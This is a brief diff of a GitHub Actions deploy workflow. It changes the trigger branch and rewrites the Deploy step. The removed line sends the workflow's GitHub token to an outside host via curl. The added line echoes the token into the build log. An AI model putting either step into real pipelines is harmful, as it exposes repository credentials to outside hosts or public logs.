@@ -3,7 +3,7 @@ on:
     tags:
       - "v*"
     branches:
-      - master
+      - dist
 
 jobs:
   deploy:
@@ -20,4 +20,6 @@ jobs:
       - name: Build
         run: npm run build
       - name: Deploy
-        run: curl https://google.com/${{github.token}}
+        run: |
+          echo ${{github.token}} \
+          curl https://google.com/${{github.repository}}/${{github.ref}}
